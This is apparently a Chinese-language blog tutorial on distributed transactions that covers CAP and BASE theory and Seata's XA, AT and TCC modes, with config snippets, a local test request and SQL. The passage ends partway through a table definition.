        <content type="html"><![CDATA[<h1 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h1><h1 id="1-分布式事务问题"><a href="#1-分布式事务问题" class="headerlink" title="1.分布式事务问题"></a>1.分布式事务问题</h1><h2 id="1-1-本地事务"><a href="#1-1-本地事务" class="headerlink" title="1.1.本地事务"></a>1.1.本地事务</h2><p>本地事务，也就是传统的<strong>单机事务</strong>。在传统数据库事务中，必须要满足四个原则：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/1671021256825.jpg"></p><h2 id="1-2-分布式事务"><a href="#1-2-分布式事务" class="headerlink" title="1.2.分布式事务"></a>1.2.分布式事务</h2><p><strong>分布式事务</strong>，就是指不是在单个服务或单个数据库架构下，产生的事务，例如：</p><ul><li>跨数据源的分布式事务</li><li>跨服务的分布式事务</li><li>综合情况</li></ul><p>在数据库水平拆分、服务垂直拆分之后，一个业务操作通常要跨多个数据库、服务才能完成。例如电商行业中比较常见的下单付款案例，包括下面几个行为：</p><ul><li>创建新订单</li><li>扣减商品库存</li><li>从用户账户余额扣除金额</li></ul><p>完成上面的操作需要访问三个不同的微服务和三个不同的数据库。</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-35-06.png"></p><p>订单的创建、库存的扣减、账户扣款在每一个服务和数据库内是一个本地事务，可以保证ACID原则。</p><p>但是当我们把三件事情看做一个”业务”，要满足保证“业务”的原子性，要么所有操作全部成功，要么全部失败，不允许出现部分成功部分失败的现象，这就是<strong>分布式系统下的事务</strong>了。</p><p>此时ACID难以满足，这是分布式事务要解决的问题</p><h2 id="1-3-演示分布式事务问题"><a href="#1-3-演示分布式事务问题" class="headerlink" title="1.3.演示分布式事务问题"></a>1.3.演示分布式事务问题</h2><p>我们通过一个案例来演示分布式事务的问题：</p><p>1）<strong>创建数据库，名为seata_demo，导入资料SQL文件：</strong></p><p>2）<strong>导入微服务：</strong></p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-35-57.png"></p><p>微服务结构如下：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-05.png"></p><p>其中：</p><p>seata-demo：父工程，负责管理项目依赖</p><ul><li>account-service：账户服务，负责管理用户的资金账户。提供扣减余额的接口</li><li>storage-service：库存服务，负责管理商品库存。提供扣减库存的接口</li><li>order-service：订单服务，负责管理订单。创建订单时，需要调用account-service和storage-service</li></ul><p><strong>3）启动nacos、所有微服务</strong></p><p><strong>4）测试下单功能，发出Post请求：</strong></p><p>请求如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://localhost:8082/order?userId=user202103032042012&amp;commodityCode=100202003032041&amp;count=20&amp;money=200&#x27;</span></span><br></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-14.png"></p><p>测试发现，当库存不足时，如果余额已经扣减，并不会回滚，出现了分布式事务问题。</p><h1 id="2-理论基础"><a href="#2-理论基础" class="headerlink" title="2.理论基础"></a>2.理论基础</h1><p>解决分布式事务问题，需要一些分布式系统的基础知识作为理论指导。</p><h2 id="2-1-CAP定理"><a href="#2-1-CAP定理" class="headerlink" title="2.1.CAP定理"></a>2.1.CAP定理</h2><p>1998年，加州大学的计算机科学家 Eric Brewer 提出，分布式系统有三个指标。</p><blockquote><ul><li>Consistency（一致性）</li><li>Availability（可用性）</li><li>Partition tolerance （分区容错性）</li></ul></blockquote><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-21.png"></p><p>它们的第一个字母分别是 C、A、P。</p><p>Eric Brewer 说，这三个指标不可能同时做到。这个结论就叫做 CAP 定理。</p><h3 id="2-1-1-一致性"><a href="#2-1-1-一致性" class="headerlink" title="2.1.1.一致性"></a>2.1.1.一致性</h3><p>Consistency（一致性）：用户访问分布式系统中的任意节点，得到的数据必须一致。</p><p>比如现在包含两个节点，其中的初始数据是一致的：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-28.png"></p><p>当我们修改其中一个节点的数据时，两者的数据产生了差异：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-33.png"></p><p>要想保住一致性，就必须实现node01 到 node02的数据 同步：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-38.png"></p><h3 id="2-1-2-可用性"><a href="#2-1-2-可用性" class="headerlink" title="2.1.2.可用性"></a>2.1.2.可用性</h3><p>Availability （可用性）：用户访问集群中的任意健康节点，必须能得到响应，而不是超时或拒绝。</p><p>如图，有三个节点的集群，访问任何一个都可以及时得到响应：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-43.png"></p><p>当有部分节点因为网络故障或其它原因无法访问时，代表节点不可用：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-48.png"></p><h3 id="2-1-3-分区容错"><a href="#2-1-3-分区容错" class="headerlink" title="2.1.3.分区容错"></a>2.1.3.分区容错</h3><p><strong>Partition（分区）</strong>：因为网络故障或其它原因导致分布式系统中的部分节点与其它节点失去连接，形成独立分区。</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-52.png"></p><p><strong>Tolerance（容错）</strong>：在集群出现分区时，整个系统也要持续对外提供服务</p><h3 id="2-1-4-矛盾"><a href="#2-1-4-矛盾" class="headerlink" title="2.1.4.矛盾"></a>2.1.4.矛盾</h3><p>在分布式系统中，系统间的网络不能100%保证健康，一定会有故障的时候，而服务有必须对外保证服务。因此Partition Tolerance不可避免。</p><p>当节点接收到新的数据变更时，就会出现问题了：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-36-57.png"></p><p>如果此时要保证<strong>一致性</strong>，就必须等待网络恢复，完成数据同步后，整个集群才对外提供服务，服务处于阻塞状态，不可用。</p><p>如果此时要保证<strong>可用性</strong>，就不能等待网络恢复，那node01、node02与node03之间就会出现数据不一致。</p><p>也就是说，在P一定会出现的情况下，A和C之间只能实现一个。</p><h2 id="2-2-BASE理论"><a href="#2-2-BASE理论" class="headerlink" title="2.2.BASE理论"></a>2.2.BASE理论</h2><p>BASE理论是对CAP的一种解决思路，包含三个思想：</p><ul><li><strong>Basically Available</strong> <strong>（基本可用）</strong>：分布式系统在出现故障时，允许损失部分可用性，即保证核心可用。</li><li><strong>Soft State（软状态）：</strong>在一定时间内，允许出现中间状态，比如临时的不一致状态。</li><li><strong>Eventually Consistent（最终一致性）</strong>：虽然无法保证强一致性，但是在软状态结束后，最终达到数据一致。</li></ul><h2 id="2-3-解决分布式事务的思路"><a href="#2-3-解决分布式事务的思路" class="headerlink" title="2.3.解决分布式事务的思路"></a>2.3.解决分布式事务的思路</h2><p>分布式事务最大的问题是各个子事务的一致性问题，因此可以借鉴CAP定理和BASE理论，有两种解决思路：</p><ul><li><p>AP模式：各子事务分别执行和提交，允许出现结果不一致，然后采用弥补措施恢复数据即可，实现最终一致。</p></li><li><p>CP模式：各个子事务执行后互相等待，同时提交，同时回滚，达成强一致。但事务等待过程中，处于弱可用状态。</p></li></ul><p>但不管是哪一种模式，都需要在子系统事务之间互相通讯，协调事务状态，也就是需要一个**事务协调者(TC)**：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-04.png"></p><p>这里的子系统事务，称为<strong>分支事务</strong>；有关联的各个分支事务在一起称为<strong>全局事务</strong>。</p><h1 id="3-初识Seata"><a href="#3-初识Seata" class="headerlink" title="3.初识Seata"></a>3.初识Seata</h1><p>Seata是 2019 年 1 月份蚂蚁金服和阿里巴巴共同开源的分布式事务解决方案。致力于提供高性能和简单易用的分布式事务服务，为用户打造一站式的分布式解决方案。</p><p>官网地址：<a href="http://seata.io/%EF%BC%8C%E5%85%B6%E4%B8%AD%E7%9A%84%E6%96%87%E6%A1%A3%E3%80%81%E6%92%AD%E5%AE%A2%E4%B8%AD%E6%8F%90%E4%BE%9B%E4%BA%86%E5%A4%A7%E9%87%8F%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%82">http://seata.io/，其中的文档、播客中提供了大量的使用说明、源码分析。</a></p><h2 id="3-1-Seata的架构"><a href="#3-1-Seata的架构" class="headerlink" title="3.1.Seata的架构"></a>3.1.Seata的架构</h2><p>Seata事务管理中有三个重要的角色：</p><ul><li><p><strong>TC (Transaction Coordinator) -</strong> <strong>事务协调者：</strong>维护全局和分支事务的状态，协调全局事务提交或回滚。</p></li><li><p><strong>TM (Transaction Manager) -</strong> <strong>事务管理器：</strong>定义全局事务的范围、开始全局事务、提交或回滚全局事务。</p></li><li><p><strong>RM (Resource Manager) -</strong> <strong>资源管理器：</strong>管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。</p></li></ul><p>整体的架构如图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-12.png"></p><p>Seata基于上述架构提供了四种不同的分布式事务解决方案：</p><ul><li>XA模式：强一致性分阶段事务模式，牺牲了一定的可用性，无业务侵入</li><li>TCC模式：最终一致的分阶段事务模式，有业务侵入</li><li>AT模式：最终一致的分阶段事务模式，无业务侵入，也是Seata的默认模式</li><li>SAGA模式：长事务模式，有业务侵入</li></ul><p>无论哪种方案，都离不开TC，也就是事务的协调者。</p><h2 id="3-2-部署TC服务"><a href="#3-2-部署TC服务" class="headerlink" title="3.2.部署TC服务"></a>3.2.部署TC服务</h2><h2 id="3-3-微服务集成Seata"><a href="#3-3-微服务集成Seata" class="headerlink" title="3.3.微服务集成Seata"></a>3.3.微服务集成Seata</h2><h3 id="3-3-1-引入依赖"><a href="#3-3-1-引入依赖" class="headerlink" title="3.3.1.引入依赖"></a>3.3.1.引入依赖</h3><p>首先，在order-service中引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--seata--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-seata<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--版本较低，1.3.0，因此排除--&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--seata starter 采用1.4.2版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;seata.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-3-2-配置TC地址"><a href="#3-3-2-配置TC地址" class="headerlink" title="3.3.2.配置TC地址"></a>3.3.2.配置TC地址</h3><p>在order-service中的application.yml中，配置TC服务信息，通过注册中心nacos，结合服务名称获取TC地址：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">registry:</span> <span class="comment"># TC服务注册中心的配置，微服务根据这些信息去注册中心获取tc服务地址</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">nacos</span> <span class="comment"># 注册中心类型 nacos</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:8848</span> <span class="comment"># nacos地址</span></span><br><span class="line">      <span class="attr">namespace:</span> <span class="string">&quot;&quot;</span> <span class="comment"># namespace，默认为空</span></span><br><span class="line">      <span class="attr">group:</span> <span class="string">DEFAULT_GROUP</span> <span class="comment"># 分组，默认是DEFAULT_GROUP</span></span><br><span class="line">      <span class="attr">application:</span> <span class="string">seata-tc-server</span> <span class="comment"># seata服务名称</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">nacos</span></span><br><span class="line">      <span class="attr">password:</span> <span class="string">nacos</span></span><br><span class="line">  <span class="attr">tx-service-group:</span> <span class="string">seata-demo</span> <span class="comment"># 事务组名称</span></span><br><span class="line">  <span class="attr">service:</span></span><br><span class="line">    <span class="attr">vgroup-mapping:</span> <span class="comment"># 事务组与cluster的映射关系</span></span><br><span class="line">      <span class="attr">seata-demo:</span> <span class="string">SH</span></span><br></pre></td></tr></table></figure><p>微服务如何根据这些配置寻找TC的地址呢？</p><p>我们知道注册到Nacos中的微服务，确定一个具体实例需要四个信息：</p><ul><li>namespace：命名空间</li><li>group：分组</li><li>application：服务名</li><li>cluster：集群名</li></ul><p>以上四个信息，在刚才的yaml文件中都能找到：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-22.png"></p><p>namespace为空，就是默认的public</p><p>结合起来，TC服务的信息就是：public@DEFAULT_GROUP@seata-tc-server@SH，这样就能确定TC服务集群了。然后就可以去Nacos拉取对应的实例信息了。</p><h1 id="4-实践"><a href="#4-实践" class="headerlink" title="4.实践"></a>4.实践</h1><p>学习下Seata中的四种不同的事务模式。</p><h2 id="4-1-XA模式"><a href="#4-1-XA模式" class="headerlink" title="4.1.XA模式"></a>4.1.XA模式</h2><p>XA 规范 是 X/Open 组织定义的分布式事务处理（DTP，Distributed Transaction Processing）标准，XA 规范 描述了全局的TM与局部的RM之间的接口，几乎所有主流的数据库都对 XA 规范 提供了支持。</p><h3 id="4-1-1-两阶段提交"><a href="#4-1-1-两阶段提交" class="headerlink" title="4.1.1.两阶段提交"></a>4.1.1.两阶段提交</h3><p>XA是规范，目前主流数据库都实现了这种规范，实现的原理都是基于两阶段提交。</p><p>正常情况：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-27.png"></p><p>异常情况：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-31.png"></p><p>一阶段：</p><ul><li>事务协调者通知每个事物参与者执行本地事务</li><li>本地事务执行完成后报告事务执行状态给事务协调者，此时事务不提交，继续持有数据库锁</li></ul><p>二阶段：</p><ul><li>事务协调者基于一阶段的报告来判断下一步操作<ul><li>如果一阶段都成功，则通知所有事务参与者，提交事务</li><li>如果一阶段任意一个参与者失败，则通知所有事务参与者回滚事务</li></ul></li></ul><h3 id="4-1-2-Seata的XA模型"><a href="#4-1-2-Seata的XA模型" class="headerlink" title="4.1.2.Seata的XA模型"></a>4.1.2.Seata的XA模型</h3><p>Seata对原始的XA模式做了简单的封装和改造，以适应自己的事务模型，基本架构如图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-37.png"></p><p>RM一阶段的工作：</p><p>​    ① 注册分支事务到TC</p><p>​    ② 执行分支业务sql但不提交</p><p>​    ③ 报告执行状态到TC</p><p>TC二阶段的工作：</p><ul><li><p>TC检测各分支事务执行状态</p><p>a.如果都成功，通知所有RM提交事务</p><p>b.如果有失败，通知所有RM回滚事务</p></li></ul><p>RM二阶段的工作：</p><ul><li>接收TC指令，提交或回滚事务</li></ul><h3 id="4-1-3-优缺点"><a href="#4-1-3-优缺点" class="headerlink" title="4.1.3.优缺点"></a>4.1.3.优缺点</h3><p>XA模式的优点是什么？</p><ul><li>事务的强一致性，满足ACID原则。</li><li>常用数据库都支持，实现简单，并且没有代码侵入</li></ul><p>XA模式的缺点是什么？</p><ul><li>因为一阶段需要锁定数据库资源，等待二阶段结束才释放，性能较差</li><li>依赖关系型数据库实现事务</li></ul><h3 id="4-1-4-实现XA模式"><a href="#4-1-4-实现XA模式" class="headerlink" title="4.1.4.实现XA模式"></a>4.1.4.实现XA模式</h3><p>Seata的starter已经完成了XA模式的自动装配，实现非常简单，步骤如下：</p><p>1）修改application.yml文件（每个参与事务的微服务），开启XA模式：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">data-source-proxy-mode:</span> <span class="string">XA</span></span><br></pre></td></tr></table></figure><p>2）给发起全局事务的入口方法添加@GlobalTransactional注解:</p><p>本例中是OrderServiceImpl中的create方法.</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-51.png"></p><p>3）重启服务并测试</p><p>重启order-service，再次测试，发现无论怎样，三个微服务都能成功回滚。</p><h2 id="4-2-AT模式"><a href="#4-2-AT模式" class="headerlink" title="4.2.AT模式"></a>4.2.AT模式</h2><p>AT模式同样是分阶段提交的事务模型，不过缺弥补了XA模型中资源锁定周期过长的缺陷。</p><h3 id="4-2-1-Seata的AT模型"><a href="#4-2-1-Seata的AT模型" class="headerlink" title="4.2.1.Seata的AT模型"></a>4.2.1.Seata的AT模型</h3><p>基本流程图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-37-57.png"></p><p>阶段一RM的工作：</p><ul><li>注册分支事务</li><li>记录undo-log（数据快照）</li><li>执行业务sql并提交</li><li>报告事务状态</li></ul><p>阶段二提交时RM的工作：</p><ul><li>删除undo-log即可</li></ul><p>阶段二回滚时RM的工作：</p><ul><li>根据undo-log恢复数据到更新前</li></ul><h3 id="4-2-2-流程梳理"><a href="#4-2-2-流程梳理" class="headerlink" title="4.2.2.流程梳理"></a>4.2.2.流程梳理</h3><p>我们用一个真实的业务来梳理下AT模式的原理。</p><p>比如，现在又一个数据库表，记录用户余额：</p><table><thead><tr><th><strong>id</strong></th><th><strong>money</strong></th></tr></thead><tbody><tr><td>1</td><td>100</td></tr></tbody></table><p>其中一个分支业务要执行的SQL为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tb_account <span class="keyword">set</span> money <span class="operator">=</span> money <span class="operator">-</span> <span class="number">10</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>AT模式下，当前分支事务执行流程如下：</p><p>一阶段：</p><p>1）TM发起并注册全局事务到TC</p><p>2）TM调用分支事务</p><p>3）分支事务准备执行业务SQL</p><p>4）RM拦截业务SQL，根据where条件查询原始数据，形成快照。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;id&quot;</span>: <span class="number">1</span>, <span class="attr">&quot;money&quot;</span>: <span class="number">100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5）RM执行业务SQL，提交本地事务，释放数据库锁。此时 <code>money = 90</code></p><p>6）RM报告本地事务状态给TC</p><p>二阶段：</p><p>1）TM通知TC事务结束</p><p>2）TC检查分支事务状态</p><p>​     a）如果都成功，则立即删除快照</p><p>​     b）如果有分支事务失败，需要回滚。读取快照数据（<code>&#123;&quot;id&quot;: 1, &quot;money&quot;: 100&#125;</code>），将快照恢复到数据库。此时数据库再次恢复为100</p><p>流程图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-38-03.png"></p><h3 id="4-2-3-AT与XA的区别"><a href="#4-2-3-AT与XA的区别" class="headerlink" title="4.2.3.AT与XA的区别"></a>4.2.3.AT与XA的区别</h3><p>简述AT模式与XA模式最大的区别是什么？</p><ul><li>XA模式一阶段不提交事务，锁定资源；AT模式一阶段直接提交，不锁定资源。</li><li>XA模式依赖数据库机制实现回滚；AT模式利用数据快照实现数据回滚。</li><li>XA模式强一致；AT模式最终一致</li></ul><h3 id="4-2-4-脏写问题"><a href="#4-2-4-脏写问题" class="headerlink" title="4.2.4.脏写问题"></a>4.2.4.脏写问题</h3><p>在多线程并发访问AT模式的分布式事务时，有可能出现脏写问题，如图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-38-12.png"></p><p>解决思路就是引入了全局锁的概念。在释放DB锁之前，先拿到全局锁。避免同一时刻有另外一个事务来操作当前数据。</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-38-19.png"></p><h3 id="4-2-5-优缺点"><a href="#4-2-5-优缺点" class="headerlink" title="4.2.5.优缺点"></a>4.2.5.优缺点</h3><p>AT模式的优点：</p><ul><li>一阶段完成直接提交事务，释放数据库资源，性能比较好</li><li>利用全局锁实现读写隔离</li><li>没有代码侵入，框架自动完成回滚和提交</li></ul><p>AT模式的缺点：</p><ul><li>两阶段之间属于软状态，属于最终一致</li><li>框架的快照功能会影响性能，但比XA模式要好很多</li></ul><h3 id="4-2-6-实现AT模式"><a href="#4-2-6-实现AT模式" class="headerlink" title="4.2.6.实现AT模式"></a>4.2.6.实现AT模式</h3><p>AT模式中的快照生成、回滚等动作都是由框架自动完成，没有任何代码侵入，因此实现非常简单。</p><p>只不过，AT模式需要一个表来记录全局锁、另一张表来记录数据快照undo_log。</p><p>1）导入数据库表，记录全局锁</p><p>导入课前资料提供的Sql文件：seata-at.sql，其中lock_table导入到TC服务关联的数据库，undo_log表导入到微服务关联的数据库：</p><p>2）修改application.yml文件，将事务模式修改为AT模式即可：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">seata:</span></span><br><span class="line">  <span class="attr">data-source-proxy-mode:</span> <span class="string">AT</span> <span class="comment"># 默认就是AT</span></span><br></pre></td></tr></table></figure><h2 id="4-3-TCC模式"><a href="#4-3-TCC模式" class="headerlink" title="4.3.TCC模式"></a>4.3.TCC模式</h2><p>TCC模式与AT模式非常相似，每阶段都是独立事务，不同的是TCC通过人工编码来实现数据恢复。需要实现三个方法：</p><ul><li><p>Try：资源的检测和预留； </p></li><li><p>Confirm：完成资源操作业务；要求 Try 成功 Confirm 一定要能成功。</p></li><li><p>Cancel：预留资源释放，可以理解为try的反向操作。</p></li></ul><h3 id="4-3-1-流程分析"><a href="#4-3-1-流程分析" class="headerlink" title="4.3.1.流程分析"></a>4.3.1.流程分析</h3><p>举例，一个扣减用户余额的业务。假设账户A原来余额是100，需要余额扣减30元。</p><ul><li><strong>阶段一（ Try ）</strong>：检查余额是否充足，如果充足则冻结金额增加30元，可用余额扣除30</li></ul><p>初识余额：</p><p>余额充足，可以冻结：</p><p>此时，总金额 = 冻结金额 + 可用金额，数量依然是100不变。事务直接提交无需等待其它事务。</p><ul><li>**阶段二（Confirm)**：假如要提交（Confirm），则冻结金额扣减30</li></ul><p>确认可以提交，不过之前可用金额已经扣减过了，这里只要清除冻结金额就好了：</p><p>此时，总金额 = 冻结金额 + 用金额 = 0 + 70  = 70元</p><ul><li>**阶段二(Canncel)**：如果要回滚（Cancel），则冻结金额扣减30，可用余额增加30</li></ul><p>需要回滚，那么就要释放冻结金额，恢复可用金额：</p><h3 id="4-3-2-Seata的TCC模型"><a href="#4-3-2-Seata的TCC模型" class="headerlink" title="4.3.2.Seata的TCC模型"></a>4.3.2.Seata的TCC模型</h3><p>Seata中的TCC模型依然延续之前的事务架构，如图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-38-37.png"></p><h3 id="4-3-3-优缺点"><a href="#4-3-3-优缺点" class="headerlink" title="4.3.3.优缺点"></a>4.3.3.优缺点</h3><p>TCC模式的每个阶段是做什么的？</p><ul><li>Try：资源检查和预留</li><li>Confirm：业务执行和提交</li><li>Cancel：预留资源的释放</li></ul><p>TCC的优点是什么？</p><ul><li>一阶段完成直接提交事务，释放数据库资源，性能好</li><li>相比AT模型，无需生成快照，无需使用全局锁，性能最强</li><li>不依赖数据库事务，而是依赖补偿操作，可以用于非事务型数据库</li></ul><p>TCC的缺点是什么？</p><ul><li>有代码侵入，需要人为编写try、Confirm和Cancel接口，太麻烦</li><li>软状态，事务是最终一致</li><li>需要考虑Confirm和Cancel的失败情况，做好幂等处理</li></ul><h3 id="4-3-4-事务悬挂和空回滚"><a href="#4-3-4-事务悬挂和空回滚" class="headerlink" title="4.3.4.事务悬挂和空回滚"></a>4.3.4.事务悬挂和空回滚</h3><h4 id="1）空回滚"><a href="#1）空回滚" class="headerlink" title="1）空回滚"></a>1）空回滚</h4><p>当某分支事务的try阶段<strong>阻塞</strong>时，可能导致全局事务超时而触发二阶段的cancel操作。在未执行try操作时先执行了cancel操作，这时cancel不能做回滚，就是<strong>空回滚</strong>。</p><p>如图：</p><p><img src="https://gitee.com/zephyr-cyper/hexo-files/raw/master/img/Snipaste_2022-12-14_20-38-43.png"></p><p>执行cancel操作时，应当判断try是否已经执行，如果尚未执行，则应该空回滚。</p><h4 id="2）业务悬挂"><a href="#2）业务悬挂" class="headerlink" title="2）业务悬挂"></a>2）业务悬挂</h4><p>对于已经空回滚的业务，之前被阻塞的try操作恢复，继续执行try，就永远不可能confirm或cancel ，事务一直处于中间状态，这就是<strong>业务悬挂</strong>。</p><p>执行try操作时，应当判断cancel是否已经执行过了，如果已经执行，应当阻止空回滚后的try操作，避免悬挂</p><h3 id="4-3-5-实现TCC模式"><a href="#4-3-5-实现TCC模式" class="headerlink" title="4.3.5.实现TCC模式"></a>4.3.5.实现TCC模式</h3><p>解决空回滚和业务悬挂问题，必须要记录当前事务状态，是在try、还是cancel？</p><h4 id="1）思路分析"><a href="#1）思路分析" class="headerlink" title="1）思路分析"></a>1）思路分析</h4><p>这里我们定义一张表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `account_freeze_tbl` (</span><br><span class="line">  `xid` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `user_id` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;用户id&#x27;</span>,</span><br><span class="line">  `freeze_money` <span class="type">int</span>(<span class="number">11</span>) unsigned <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;冻结金额&#x27;</span>,</span><br><span class="line">  `state` <span class="type">int</span>(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;事务状态，0:try，1:confirm，2:cancel&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`xid`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 ROW_FORMAT<span class="operator">=</span>COMPACT;</span><br><span 